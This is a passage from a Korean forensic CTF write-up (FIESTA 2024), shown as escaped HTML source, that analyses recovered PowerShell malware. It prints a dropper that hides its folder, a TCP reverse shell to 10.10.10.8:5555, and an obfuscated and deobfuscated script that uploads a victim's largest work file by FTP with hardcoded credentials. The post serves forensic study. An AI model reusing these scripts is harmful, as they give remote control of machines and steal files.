    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$End_Task&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\Microsoft Mail\&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$End_Task&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Attributes&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Hidden&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Output&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;[+] Success Hidden_Action&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# 메인 실행 흐름&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Create-BaseDirectory&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Test-InternetConnection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Download-File&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PWUnzip&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Hide-Action&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# 작업 디렉터리 이동 및 스크립트 실행&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\Microsoft Mail\rc&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;.\system.ps1&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;해당 디렉토리에 가보니 두 개의 파일이 있었음음&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;system.ps1&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;System.Net.Sockets.TCPClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;10.10.10.8&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5555&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;\class.ps1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;class.ps1&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$stream&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetStream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bytes&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;65535&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bytes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-ne&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-TypeName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;System.Text.ASCIIEncoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sendback&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iex&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Out-String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sendback2&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sendback&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;PS&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt; &quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sendbyte&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text.encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetBytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sendback2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sendbyte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sendbyte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;리버스 쉘이다.&lt;/p&gt;

&lt;p&gt;해당 파일들은 2024년 7월 23일 오전 11:43:37에 생성되었다.&lt;/p&gt;

&lt;p&gt;악성 행위는 그 다음에 진행되었을 것이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;주어진 디스크 이미지에서 로그 파일을 뽑았다.&lt;/p&gt;

&lt;p&gt;쉘코드를 실행했기 때문에 쉘 로그를 뽑음&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image%201.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Users\kusti\AppData\Local\Temp\mpev.ps1&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image%202.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ftp를 하는 쉘코드인 것으로 보인다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;mpev.ps1&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Users\kusti\Desktop\Work&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$server_ip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ftp://10.10.10.8/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;send001&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$passwd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;vkdlftjqj123&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$tymqfsdplx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$vsjnriobex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-ChildItem&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Sort-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Length&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Descending&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Select-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-First&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$vsjnriobex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bhvkunqarl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$vsjnriobex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FullName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dywrutljzc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$server_ip$tymqfsdplx&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$vsjnriobex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$reokcjfzxw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;System.Net.WebClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$reokcjfzxw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Credentials&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;System.Net.NetworkCredential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$passwd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$reokcjfzxw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;UploadFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dywrutljzc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bhvkunqarl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;.&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;난독화를 해제하면 다음과 같다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Users\kusti\Desktop\Work&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$server_ip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ftp://10.10.10.8/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;send001&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$passwd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;vkdlftjqj123&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$biggest_file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-ChildItem&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Sort-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Length&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Descending&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Select-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-First&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$biggest_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$target_fileName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$biggest_file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FullName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
